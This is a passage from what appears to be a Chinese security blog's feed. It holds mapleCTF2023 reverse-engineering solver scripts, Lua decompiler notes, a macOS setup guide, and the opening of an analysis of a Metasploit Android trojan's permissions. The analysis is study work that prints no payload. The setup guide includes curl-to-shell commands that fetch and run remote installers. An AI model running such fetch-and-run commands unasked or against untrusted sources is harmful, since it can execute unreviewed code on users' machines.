        for j in range(len(bad)):
            if(idc.get_wide_byte(i+j)!= bad[j]):
                flag=0
                break
        if flag==1:
            for j in range(len(bad)):
                patch_byte(i+j,0x90)
                print(&quot;success&quot;)
</code></pre>
]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>mac环境配置</title>
    <url>/2023/11/29/mac%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h6 id="PREFACE："><a href="#PREFACE：" class="headerlink" title="PREFACE："></a>PREFACE：</h6><h6 id="Q：ios调试环境怎么搞？"><a href="#Q：ios调试环境怎么搞？" class="headerlink" title="Q：ios调试环境怎么搞？"></a>Q：ios调试环境怎么搞？</h6><h6 id="A：买台mac"><a href="#A：买台mac" class="headerlink" title="A：买台mac"></a>A：买台mac</h6><span id="more"></span>

<p><a href="https://zhuanlan.zhihu.com/p/441676276">zsh 安装与配置：9步打造高效命令行 - 知乎 (zhihu.com)</a></p>
<ul>
<li><a href="https://brew.sh/">Homebrew — The Missing Package Manager for macOS (or Linux)</a>安装命令行</li>
</ul>
<blockquote>
<p>&#x2F;bin&#x2F;bash -c “$(curl -fsSL <a href="https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)&quot;">https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)&quot;</a></p>
</blockquote>
<ul>
<li>环境变量：</li>
</ul>
<blockquote>
<p>echo “export PATH&#x3D;&#x2F;opt&#x2F;homebrew&#x2F;bin:$PATH” &gt;&gt; ~&#x2F;.zshrc</p>
</blockquote>
<ul>
<li>安装</li>
</ul>
<blockquote>
<p>brew install</p>
</blockquote>
<ul>
<li>zsh命令行</li>
</ul>
<blockquote>
<p>brew install zsh</p>
</blockquote>
<ul>
<li>oh-my-zsh</li>
</ul>
<blockquote>
<p>sh -c “$(curl -fsSL <a href="https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;">https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;</a></p>
</blockquote>
<ul>
<li>zsh-autosuggestions 命令行提示插件</li>
</ul>
<blockquote>
<p>git clone <a href="https://github.com/zsh-users/zsh-autosuggestions">https://github.com/zsh-users/zsh-autosuggestions</a> ${ZSH_CUSTOM:-~&#x2F;.oh-my-zsh&#x2F;custom}&#x2F;plugins&#x2F;zsh-autosuggestions</p>
</blockquote>
<p>在 <code>.zshrc</code> 中，把 <code>zsh-autosuggestions</code> 加入插件列表：</p>
<pre><code>plugins=(
    # other plugins...
    zsh-autosuggestions  # 插件之间使用空格隔开
)
</code></pre>
<ul>
<li>zsh-syntax-highlighting命令语法校验</li>
</ul>
<blockquote>
<p>git clone <a href="https://github.com/zsh-users/zsh-syntax-highlighting.git">https://github.com/zsh-users/zsh-syntax-highlighting.git</a> ${ZSH_CUSTOM:-~&#x2F;.oh-my-zsh&#x2F;custom}&#x2F;plugins&#x2F;zsh-syntax-highlighting </p>
</blockquote>
<p>在 .zshrc 中，把 <code>zsh-syntax-highlighting</code> 加入插件列表：</p>
<pre><code>plugins=(
    # other plugins...
    zsh-autosuggestions
    zsh-syntax-highlighting
)
</code></pre>
<ul>
<li>传输文件</li>
</ul>
<blockquote>
<p>python -m http.server</p>
</blockquote>
<ul>
<li>远程ida</li>
</ul>
<blockquote>
<p>把权限开了运行macos那个arm server局域网远程就行</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>mapleCTF2023</title>
    <url>/2023/10/01/mapleCTF2023/</url>
    <content><![CDATA[<h6 id="PREFACE-maple前四个题做的挺快的还，看题的队甚至小冲分了一下（什）"><a href="#PREFACE-maple前四个题做的挺快的还，看题的队甚至小冲分了一下（什）" class="headerlink" title="PREFACE: maple前四个题做的挺快的还，看题的队甚至小冲分了一下（什）"></a>PREFACE: maple前四个题做的挺快的还，看题的队甚至小冲分了一下（什）</h6><h6 id="最后那个安卓确实出的有点问题，怎么都搜不出来，总的来说算是还好的比赛吧"><a href="#最后那个安卓确实出的有点问题，怎么都搜不出来，总的来说算是还好的比赛吧" class="headerlink" title="最后那个安卓确实出的有点问题，怎么都搜不出来，总的来说算是还好的比赛吧"></a>最后那个安卓确实出的有点问题，怎么都搜不出来，总的来说算是还好的比赛吧</h6><h6 id="10-2-算是出了，不过确实看着别的师傅有点算法高手的"><a href="#10-2-算是出了，不过确实看着别的师傅有点算法高手的" class="headerlink" title="10.2: 算是出了，不过确实看着别的师傅有点算法高手的"></a>10.2: 算是出了，不过确实看着别的师傅有点算法高手的</h6><span id="more"></span>

<h3 id="baby-rev"><a href="#baby-rev" class="headerlink" title="baby_rev"></a>baby_rev</h3><p>就是一些check，比较容易，后面注意分两段输入，否则可能有问题</p>
<pre><code class="python">from z3 import *

# 创建Solver实例
solver = Solver()
a = Int(&#39;a&#39;)
b = Int(&#39;b&#39;)
# solver.add(a * 4 + b * 5 == 127)
# solver.add(a &gt; 0)
# solver.add(b &gt; 0)
# solver.add(a + b &lt; 30)
# solutions = []
# while solver.check() == sat:
#     model = solver.model()
#     a_val = model[a].as_long()
#     b_val = model[b].as_long()
#     solutions.append((a_val, b_val))
#     solver.add(Or(a != a_val, b != b_val))
# for sol in solutions:
#     print(sol)

# ---
solver.add((a * 6 + b * 13) % 3 == 1)
solver.add((a * 6 + b * 13) % 4 == 3)
solver.add((a * 6 + b * 13) % 5 == 1)
solver.add(a + b &lt;= 6)
if solver.check() == sat:
    print(solver.model())

# ---
</code></pre>
<p>exp.py</p>
<pre><code class="python">for _ in range(18):
    print(9,end=&#39;&#39;)
for _ in range(11):
    print(5,end=&#39;&#39;)

for _ in range(3):
    print(4,end=&#39;&#39;)
print(2,end=&#39;&#39;)
print()
print(80673,end=&#39;&#39;)

# 999999999999999999555555555554442
# 80673
</code></pre>
<h3 id="JavieScript"><a href="#JavieScript" class="headerlink" title="JavieScript"></a>JavieScript</h3><p>源程序看起来就有各种问题…</p>
<p>不过按照字符数量直接爆破即可</p>
<pre><code class="python">import hashlib
import string
def hash_string(s):
    return hashlib.sha256(s.encode()).hexdigest()

possible_values_for_one = &#39;1234567890abcdef&#39;

possible_values_for_two = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-_=+[]&#123;&#125;|;:,.&lt;&gt;?/\\\&#39;&quot;&#39;
# possible_values_for_two = string.printable[:-5]  # -5 to exclude whitespace and control characters


base_fleg = &quot;maple&#123;&quot;
for i in possible_values_for_two:
    for val_one in possible_values_for_two:
        for char_two in possible_values_for_two:
            temp_fleg = base_fleg + val_one  + &#39;a&#39; + i + &#39;a&#39; + char_two * 4 + &#39;as&#39; + &quot;_are_a_mId_FruiT&#125;&quot;
            # print(temp_fleg)
            if hash_string(temp_fleg) == &quot;bfe06d1e92942a0eca51881a879a0a9aef3fe75acaece04877eb0a26ceb8710d&quot;:
                print(&quot;Found fleg:&quot;, temp_fleg)
                break
                
# maple&#123;baNannnnas_are_a_mId_FruiT&#125;
</code></pre>
<h3 id="tarpit"><a href="#tarpit" class="headerlink" title="tarpit"></a>tarpit</h3><p>没见过的虚拟机，可以调着看他大概的行为（这里的注释不一定完全准确）</p>
<p><img src="/2023/10/01/mapleCTF2023/image-20231001202626013.png" alt="image-20231001202626013"></p>
<p>其本身的opcode非常有规律，每五个数字会反复出现，而且有明显的指令0 4 8，简单调试猜测可以发现它会统计该数字的出现次数，直接转化成ascii，脚本提取即可（这样提取会把中间的一些指令段识别进来，加了个count &gt;&#x3D; 40的判断就刚好可以筛掉）</p>
<p>exp.py</p>
<pre><code class="python">opcode = [...]
count = 0
h = 0
d = 0x71
flag = &#39;&#39;
for i in range(1, len(opcode), 5):
    h = opcode[i]
    if (d == h):
        count += 1
    elif (d != h):
        if (count &gt;= 40):
            flag += chr(count + 1)
        d = h
        count = 0

print(flag)

# maple&#123;m1n5ky_m4ch1n35_4r3_c00l&#125;
</code></pre>
<h3 id="most-harmless"><a href="#most-harmless" class="headerlink" title="most_harmless"></a>most_harmless</h3><p>挺奇妙的，也算虚拟机吧？但是跑不起来，远程也跑不动，应该确实效率不好说…</p>
<p>app.py好理解，就是拿flag去拼接成一个语法，放在out.py里面跑类型，但是这玩意初见以为是lambda算子那种图灵完备可以做很多事情的东西，这里只是做了一个映射，距离说明就是这里实际上就是串联了一串字符而已</p>
<p><img src="/2023/10/01/mapleCTF2023/image-20231001204403663.png" alt="image-20231001204403663"></p>
<p>然后有一个指示，从29开始（一开始没看见，搜了一下它的头尾，发现确实是29，然后映射出来就行楽）</p>
<p>exp.py</p>
<pre><code class="python">data = &#123;&#39;01&#39;:&#39;12&#39;,&#39;01&#39;:&#39;12&#39;,&#39;12&#39;:&#39;08&#39;,&#39;12&#39;:&#39;08&#39;,&#39;02&#39;:&#39;30&#39;,&#39;02&#39;:&#39;30&#39;,&#39;30&#39;:&#39;06&#39;,&#39;30&#39;:&#39;06&#39;,&#39;03&#39;:&#39;05&#39;,&#39;03&#39;:&#39;05&#39;,&#39;04&#39;:&#39;16&#39;,&#39;04&#39;:&#39;16&#39;,&#39;05&#39;:&#39;45&#39;,&#39;05&#39;:&#39;45&#39;,&#39;06&#39;:&#39;46&#39;,&#39;06&#39;:&#39;46&#39;,&#39;07&#39;:&#39;24&#39;,&#39;07&#39;:&#39;24&#39;,&#39;08&#39;:&#39;61&#39;,&#39;08&#39;:&#39;61&#39;,&#39;09&#39;:&#39;58&#39;,&#39;09&#39;:&#39;58&#39;,&#39;10&#39;:&#39;68&#39;,&#39;10&#39;:&#39;68&#39;,&#39;11&#39;:&#39;19&#39;,&#39;11&#39;:&#39;19&#39;,&#39;13&#39;:&#39;40&#39;,&#39;13&#39;:&#39;40&#39;,&#39;14&#39;:&#39;38&#39;,&#39;14&#39;:&#39;38&#39;,&#39;15&#39;:&#39;65&#39;,&#39;15&#39;:&#39;65&#39;,&#39;16&#39;:&#39;67&#39;,&#39;16&#39;:&#39;67&#39;,&#39;17&#39;:&#39;11&#39;,&#39;17&#39;:&#39;11&#39;,&#39;18&#39;:&#39;02&#39;,&#39;18&#39;:&#39;02&#39;,&#39;19&#39;:&#39;39&#39;,&#39;19&#39;:&#39;39&#39;,&#39;20&#39;:&#39;27&#39;,&#39;20&#39;:&#39;27&#39;,&#39;21&#39;:&#39;43&#39;,&#39;21&#39;:&#39;43&#39;,&#39;22&#39;:&#39;51&#39;,&#39;22&#39;:&#39;51&#39;,&#39;23&#39;:&#39;63&#39;,&#39;23&#39;:&#39;63&#39;,&#39;24&#39;:&#39;59&#39;,&#39;24&#39;:&#39;59&#39;,&#39;25&#39;:&#39;62&#39;,&#39;25&#39;:&#39;62&#39;,&#39;26&#39;:&#39;53&#39;,&#39;26&#39;:&#39;53&#39;,&#39;27&#39;:&#39;10&#39;,&#39;27&#39;:&#39;10&#39;,&#39;28&#39;:&#39;69&#39;,&#39;28&#39;:&#39;69&#39;,&#39;29&#39;:&#39;31&#39;,&#39;29&#39;:&#39;31&#39;,&#39;31&#39;:&#39;57&#39;,&#39;31&#39;:&#39;57&#39;,&#39;32&#39;:&#39;25&#39;,&#39;32&#39;:&#39;25&#39;,&#39;33&#39;:&#39;34&#39;,&#39;33&#39;:&#39;34&#39;,&#39;34&#39;:&#39;66&#39;,&#39;34&#39;:&#39;66&#39;,&#39;35&#39;:&#39;28&#39;,&#39;35&#39;:&#39;28&#39;,&#39;36&#39;:&#39;09&#39;,&#39;36&#39;:&#39;09&#39;,&#39;37&#39;:&#39;23&#39;,&#39;37&#39;:&#39;23&#39;,&#39;38&#39;:&#39;03&#39;,&#39;38&#39;:&#39;03&#39;,&#39;39&#39;:&#39;70&#39;,&#39;39&#39;:&#39;70&#39;,&#39;40&#39;:&#39;32&#39;,&#39;40&#39;:&#39;32&#39;,&#39;41&#39;:&#39;55&#39;,&#39;41&#39;:&#39;55&#39;,&#39;42&#39;:&#39;52&#39;,&#39;42&#39;:&#39;52&#39;,&#39;43&#39;:&#39;60&#39;,&#39;43&#39;:&#39;60&#39;,&#39;44&#39;:&#39;01&#39;,&#39;44&#39;:&#39;01&#39;,&#39;45&#39;:&#39;64&#39;,&#39;45&#39;:&#39;64&#39;,&#39;46&#39;:&#39;71&#39;,&#39;46&#39;:&#39;71&#39;,&#39;47&#39;:&#39;20&#39;,&#39;47&#39;:&#39;20&#39;,&#39;48&#39;:&#39;17&#39;,&#39;48&#39;:&#39;17&#39;,&#39;49&#39;:&#39;56&#39;,&#39;49&#39;:&#39;56&#39;,&#39;50&#39;:&#39;33&#39;,&#39;50&#39;:&#39;33&#39;,&#39;51&#39;:&#39;15&#39;,&#39;51&#39;:&#39;15&#39;,&#39;52&#39;:&#39;07&#39;,&#39;52&#39;:&#39;07&#39;,&#39;53&#39;:&#39;04&#39;,&#39;53&#39;:&#39;04&#39;,&#39;54&#39;:&#39;22&#39;,&#39;54&#39;:&#39;22&#39;,&#39;55&#39;:&#39;42&#39;,&#39;55&#39;:&#39;42&#39;,&#39;56&#39;:&#39;36&#39;,&#39;56&#39;:&#39;36&#39;,&#39;57&#39;:&#39;49&#39;,&#39;57&#39;:&#39;49&#39;,&#39;58&#39;:&#39;41&#39;,&#39;58&#39;:&#39;41&#39;,&#39;59&#39;:&#39;21&#39;,&#39;59&#39;:&#39;21&#39;,&#39;60&#39;:&#39;44&#39;,&#39;60&#39;:&#39;44&#39;,&#39;61&#39;:&#39;13&#39;,&#39;61&#39;:&#39;13&#39;,&#39;62&#39;:&#39;37&#39;,&#39;62&#39;:&#39;37&#39;,&#39;63&#39;:&#39;14&#39;,&#39;63&#39;:&#39;14&#39;,&#39;64&#39;:&#39;54&#39;,&#39;64&#39;:&#39;54&#39;,&#39;65&#39;:&#39;50&#39;,&#39;66&#39;:&#39;26&#39;,&#39;66&#39;:&#39;26&#39;,&#39;65&#39;:&#39;50&#39;,&#39;67&#39;:&#39;47&#39;,&#39;67&#39;:&#39;47&#39;,&#39;68&#39;:&#39;35&#39;,&#39;68&#39;:&#39;35&#39;,&#39;69&#39;:&#39;48&#39;,&#39;69&#39;:&#39;48&#39;,&#39;70&#39;:&#39;18&#39;,&#39;70&#39;:&#39;18&#39;&#125;
a = &#39;29&#39;
b = &#39;&#39;
count = 0
list = []
while(b != &#39;71&#39;):
    # print(a,end=&#39; -&gt; &#39;)
    list.append(a)
    b = data[a]
    a = b
    count += 1

data_chr = &#123;&#39;01&#39; : &#39;a&#39;,&#39;01&#39; : &#39;a&#39;,&#39;12&#39; : &#39;f&#39;,&#39;12&#39; : &#39;f&#39;,&#39;02&#39; : &#39;a&#39;,&#39;02&#39; : &#39;a&#39;,&#39;30&#39; : &#39;n&#39;,&#39;30&#39; : &#39;n&#39;,&#39;03&#39; : &#39;a&#39;,&#39;03&#39; : &#39;a&#39;,&#39;04&#39; : &#39;c&#39;,&#39;04&#39; : &#39;c&#39;,&#39;05&#39; : &#39;d&#39;,&#39;05&#39; : &#39;d&#39;,&#39;06&#39; : &#39;d&#39;,&#39;06&#39; : &#39;d&#39;,&#39;07&#39; : &#39;e&#39;,&#39;07&#39; : &#39;e&#39;,&#39;08&#39; : &#39;e&#39;,&#39;08&#39; : &#39;e&#39;,&#39;09&#39; : &#39;e&#39;,&#39;09&#39; : &#39;e&#39;,&#39;10&#39; : &#39;e&#39;,&#39;10&#39; : &#39;e&#39;,&#39;11&#39; : &#39;e&#39;,&#39;11&#39; : &#39;e&#39;,&#39;13&#39; : &#39;f&#39;,&#39;13&#39; : &#39;f&#39;,&#39;14&#39; : &#39;g&#39;,&#39;14&#39; : &#39;g&#39;,&#39;15&#39; : &#39;h&#39;,&#39;15&#39; : &#39;h&#39;,&#39;16&#39; : &#39;h&#39;,&#39;16&#39; : &#39;h&#39;,&#39;17&#39; : &#39;h&#39;,&#39;17&#39; : &#39;h&#39;,&#39;18&#39; : &#39;h&#39;,&#39;18&#39; : &#39;h&#39;,&#39;19&#39; : &#39;i&#39;,&#39;19&#39; : &#39;i&#39;,&#39;20&#39; : &#39;i&#39;,&#39;20&#39; : &#39;i&#39;,&#39;21&#39; : &#39;i&#39;,&#39;21&#39; : &#39;i&#39;,&#39;22&#39; : &#39;i&#39;,&#39;22&#39; : &#39;i&#39;,&#39;23&#39; : &#39;l&#39;,&#39;23&#39; : &#39;l&#39;,&#39;24&#39; : &#39;m&#39;,&#39;24&#39; : &#39;m&#39;,&#39;25&#39; : &#39;m&#39;,&#39;25&#39; : &#39;m&#39;,&#39;26&#39; : &#39;m&#39;,&#39;26&#39; : &#39;m&#39;,&#39;27&#39; : &#39;m&#39;,&#39;27&#39; : &#39;m&#39;,&#39;28&#39; : &#39;n&#39;,&#39;28&#39; : &#39;n&#39;,&#39;29&#39; : &#39;n&#39;,&#39;29&#39; : &#39;n&#39;,&#39;31&#39; : &#39;o&#39;,&#39;31&#39; : &#39;o&#39;,&#39;32&#39; : &#39;o&#39;,&#39;32&#39; : &#39;o&#39;,&#39;33&#39; : &#39;o&#39;,&#39;33&#39; : &#39;o&#39;,&#39;34&#39; : &#39;o&#39;,&#39;34&#39; : &#39;o&#39;,&#39;35&#39; : &#39;o&#39;,&#39;35&#39; : &#39;o&#39;,&#39;36&#39; : &#39;p&#39;,&#39;36&#39; : &#39;p&#39;,&#39;37&#39; : &#39;p&#39;,&#39;37&#39; : &#39;p&#39;,&#39;38&#39; : &#39;r&#39;,&#39;38&#39; : &#39;r&#39;,&#39;39&#39; : &#39;r&#39;,&#39;39&#39; : &#39;r&#39;,&#39;40&#39; : &#39;r&#39;,&#39;40&#39; : &#39;r&#39;,&#39;41&#39; : &#39;s&#39;,&#39;41&#39; : &#39;s&#39;,&#39;42&#39; : &#39;s&#39;,&#39;42&#39; : &#39;s&#39;,&#39;43&#39; : &#39;s&#39;,&#39;43&#39; : &#39;s&#39;,&#39;44&#39; : &#39;s&#39;,&#39;44&#39; : &#39;s&#39;,&#39;45&#39; : &#39;s&#39;,&#39;45&#39; : &#39;s&#39;,&#39;46&#39; : &#39;s&#39;,&#39;46&#39; : &#39;s&#39;,&#39;47&#39; : &#39;t&#39;,&#39;47&#39; : &#39;t&#39;,&#39;48&#39; : &#39;t&#39;,&#39;48&#39; : &#39;t&#39;,&#39;49&#39; : &#39;t&#39;,&#39;49&#39; : &#39;t&#39;,&#39;50&#39; : &#39;t&#39;,&#39;50&#39; : &#39;t&#39;,&#39;51&#39; : &#39;t&#39;,&#39;51&#39; : &#39;t&#39;,&#39;52&#39; : &#39;t&#39;,&#39;52&#39; : &#39;t&#39;,&#39;53&#39; : &#39;u&#39;,&#39;53&#39; : &#39;u&#39;,&#39;54&#39; : &#39;w&#39;,&#39;54&#39; : &#39;w&#39;,&#39;55&#39; : &#39;y&#39;,&#39;55&#39; : &#39;y&#39;,&#39;56&#39; : &#39;y&#39;,&#39;56&#39; : &#39;y&#39;,&#39;57&#39; : &#39;_&#39;,&#39;57&#39; : &#39;_&#39;,&#39;58&#39; : &#39;_&#39;,&#39;58&#39; : &#39;_&#39;,&#39;59&#39; : &#39;_&#39;,&#39;59&#39; : &#39;_&#39;,&#39;60&#39; : &#39;_&#39;,&#39;60&#39; : &#39;_&#39;,&#39;61&#39; : &#39;_&#39;,&#39;61&#39; : &#39;_&#39;,&#39;62&#39; : &#39;_&#39;,&#39;62&#39; : &#39;_&#39;,&#39;63&#39; : &#39;_&#39;,&#39;63&#39; : &#39;_&#39;,&#39;64&#39; : &#39;_&#39;,&#39;64&#39; : &#39;_&#39;,&#39;65&#39; : &#39;_&#39;,&#39;66&#39; : &#39;_&#39;,&#39;66&#39; : &#39;_&#39;,&#39;65&#39; : &#39;_&#39;,&#39;67&#39; : &#39;_&#39;,&#39;67&#39; : &#39;_&#39;,&#39;68&#39; : &#39;_&#39;,&#39;68&#39; : &#39;_&#39;,&#39;69&#39; : &#39;_&#39;,&#39;69&#39; : &#39;_&#39;,&#39;70&#39; : &#39;_&#39;,&#39;70&#39; : &#39;_&#39;&#125;
print(&#39;maple&#123;&#39;,end=&#39;&#39;)
for i in list:
    print(data_chr[i],end=&#39;&#39;)
print(&#39;&#125;&#39;)

# maple&#123;no_type_system_is_safe_from_pl_grads_with_too_much_time_on_their_hands&#125;
</code></pre>
<h3 id="Artificial"><a href="#Artificial" class="headerlink" title="Artificial"></a>Artificial</h3><p>jadx逆不了，然后学长那里知道GDA这东西（确实好用）</p>
<p>逻辑还算简单，给了张表[(x,y), value]，求出所有value和为0x11dbe28的x,y，将x,y从小到大连起来，然后整个做sha256，然后取前16位做aes的key解密获得flag</p>
<p>但是数据规模是3000 * 1e7, 目前说是题目有点问题？</p>
<h6 id="10-1-21-09-增加了长度判断999"><a href="#10-1-21-09-增加了长度判断999" class="headerlink" title="10.1 21:09 增加了长度判断999"></a>10.1 21:09 增加了长度判断999</h6><p><img src="/2023/10/01/mapleCTF2023/image-20231001212212857.png" alt="image-20231001212212857"></p>
<p>…</p>
<p>感觉…不好说…</p>
<h6 id="10-2：结论：这里是个最小生成树，what？"><a href="#10-2：结论：这里是个最小生成树，what？" class="headerlink" title="10.2：结论：这里是个最小生成树，what？"></a>10.2：结论：这里是个最小生成树，what？</h6><h6 id="先上脚本，和前面分析的一样，出来的东西排序-sha256-取前16位解密AES即可"><a href="#先上脚本，和前面分析的一样，出来的东西排序-sha256-取前16位解密AES即可" class="headerlink" title="先上脚本，和前面分析的一样，出来的东西排序+sha256+取前16位解密AES即可"></a>先上脚本，和前面分析的一样，出来的东西排序+sha256+取前16位解密AES即可</h6><h6 id="但是为啥是最小生成树，还得研究一下…"><a href="#但是为啥是最小生成树，还得研究一下…" class="headerlink" title="但是为啥是最小生成树，还得研究一下…"></a>但是为啥是最小生成树，还得研究一下…</h6><pre><code class="python">with open(&quot;map.txt&quot;, &quot;r&quot;) as f:
    exec(f.read())

mp = list(map(lambda x : list(map(int, x.split(&#39;,&#39;))), mp))
mp.sort(key = lambda x : x[2])
fa = []
for i in range(1001):
    fa.append(i)

def find(x):
    if fa[x] == x:
        return x
    ret = find(fa[x])
    fa[x] = ret
    return ret

ans = 0
cnt = 0
_a = []
for a, b, res in mp:
    ffa = find(a)
    ffb = find(b)
    if (ffa == ffb):
        continue
    fa[ffa] = ffb
    ans += res
    cnt += 1
    _a.append(str(a) + &#39;,&#39; + str(b) + &#39;,&#39; + str(res))

with open(&quot;ans.txt&quot;, &quot;w&quot;) as f:
    f.write(str(_a))
</code></pre>
]]></content>
  </entry>
  <entry>
    <title>lua初探</title>
    <url>/2023/11/08/lua%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="PREFACE：一直不会搞lua题，稍微整理和学习一下"><a href="#PREFACE：一直不会搞lua题，稍微整理和学习一下" class="headerlink" title="PREFACE：一直不会搞lua题，稍微整理和学习一下"></a>PREFACE：一直不会搞lua题，稍微整理和学习一下</h6><span id="more"></span>

<p>偷了一些<a href="https://www.cnblogs.com/lordtianqiyi/articles/17000585.html">这篇博客</a>来学习学习</p>
<h5 id="lua编译："><a href="#lua编译：" class="headerlink" title="lua编译："></a>lua编译：</h5><ul>
<li>Luac</li>
<li>Luajit</li>
</ul>
<h5 id="反编译："><a href="#反编译：" class="headerlink" title="反编译："></a>反编译：</h5><p>unluac：<a href="https://sourceforge.net/projects/unluac/">https://sourceforge.net/projects/unluac/</a></p>
<p>处理lua5.0 - lua5.4</p>
<pre><code>java -jar unluac.jar luac.out &gt; 3.lua
java -jar unluac.jar --rawstring luac.out &gt; 3.lua
</code></pre>
<h4 id="2、LuaDec"><a href="#2、LuaDec" class="headerlink" title="2、LuaDec"></a>2、LuaDec</h4><p><a href="https://github.com/viruscamp/luadec">https://github.com/viruscamp/luadec</a></p>
<p>主要针对lua5.1，对lua5.2和lua5.3是实验性的 ， 依赖lua源码</p>
<pre><code>sudo apt-get install libreadline-dev 

git clone https://github.com/viruscamp/luadec
cd luadec
git submodule update --init lua-5.3   # lua5.2 就替换成 lua-5.2 下面也是一样
cd lua-5.3
make linux
cd ../luadec
make LUAVER=5.3
</code></pre>
<p>参数介绍</p>
<pre><code>-pn  : 打印函数嵌套结构
-dis : 反汇编luac.out或lua源码  # 这里的反汇编指的是生成字节码
luadec abc.lua 或 luadec  luac.out :  反编译lua源码或luac二进制文件  #这里的反编译指的是生成lua源码
</code></pre>
<hr>
<h6 id="工具先放上面，找一个实战的题来看看，这个是RCTF2022-的-picStore"><a href="#工具先放上面，找一个实战的题来看看，这个是RCTF2022-的-picStore" class="headerlink" title="工具先放上面，找一个实战的题来看看，这个是RCTF2022 的 picStore"></a>工具先放上面，找一个实战的题来看看，这个是RCTF2022 的 picStore</h6><p>题目给出的picStore.bin是一个lua二进制块，原理可以参考这篇：<a href="https://zhuanlan.zhihu.com/p/429597744">Lua源码分析（一）二进制块的加载 - 知乎 (zhihu.com)</a></p>
<p><img src="/2023/11/08/lua%E5%88%9D%E6%8E%A2/image-20231109152335694.png" alt="image-20231109152335694"></p>
<p><del>接着上面blog的做了一遍…懒得写了…</del></p>
]]></content>
  </entry>
  <entry>
    <title>msf Android马分析</title>
    <url>/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h6 id="PREFACE"><a href="#PREFACE" class="headerlink" title="PREFACE:"></a>PREFACE:</h6><span id="more"></span>

<h3 id="一、运行效果以及环境搭建"><a href="#一、运行效果以及环境搭建" class="headerlink" title="一、运行效果以及环境搭建"></a>一、运行效果以及环境搭建</h3><p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423141135014.png" alt="image-20240423141135014"></p>
<p>已知这个马上线安卓13（我的测试机环境）是会被直接拦的，尝试了一下安卓7</p>
<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423172223131.png" alt="image-20240423172223131"></p>
<p>可以上马，上的时候不会检测权限，但是shell不进去以及文件看不到，推测是权限管理系统拦了但是马没有申请，合理怀疑是安卓6.0以后需要动态申请权限，这里的马存在一定问题</p>
<p>这边上一个android5，不行，报错</p>
<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423172154053.png" alt="image-20240423172154053"></p>
<p>上一个android6，成功！</p>
<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423173618493.png" alt="image-20240423173618493"></p>
<p>简单看一下我们的权限：</p>
<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423183527824.png" alt="image-20240423183527824"></p>
<p>​		简单来说没什么用，大概研究一下应该是进应用沙箱了，但是权限是给满的，很奇怪，还是啥也干不了</p>
<h3 id="二、逆向分析"><a href="#二、逆向分析" class="headerlink" title="二、逆向分析"></a>二、逆向分析</h3><h5 id="AndroidMainfest-xml"><a href="#AndroidMainfest-xml" class="headerlink" title="AndroidMainfest.xml"></a>AndroidMainfest.xml</h5><pre><code class="xml">    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.CHANGE_WIFI_STATE&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.ACCESS_COARSE_LOCATION&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.ACCESS_FINE_LOCATION&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.SEND_SMS&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.RECEIVE_SMS&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.RECORD_AUDIO&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.CALL_PHONE&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.READ_CONTACTS&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.WRITE_CONTACTS&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.WRITE_SETTINGS&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.CAMERA&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.READ_SMS&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.SET_WALLPAPER&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.READ_CALL_LOG&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.WRITE_CALL_LOG&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.WAKE_LOCK&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS&quot;/&gt;
    &lt;uses-feature android:name=&quot;android.hardware.camera&quot;/&gt;
    &lt;uses-feature android:name=&quot;android.hardware.camera.autofocus&quot;/&gt;
    &lt;uses-feature android:name=&quot;android.hardware.microphone&quot;/&gt;
</code></pre>
<p>申请权限，注定这个马只能低版本使用</p>
<pre><code class="xml">&lt;application android:label=&quot;@string/app_name&quot;&gt;
    &lt;activity android:label=&quot;@string/app_name&quot; android:name=&quot;.MainActivity&quot; android:theme=&quot;@android:style/Theme.NoDisplay&quot;&gt;
        &lt;intent-filter&gt;
            &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt;
            &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt;
        &lt;/intent-filter&gt;
        &lt;intent-filter&gt;
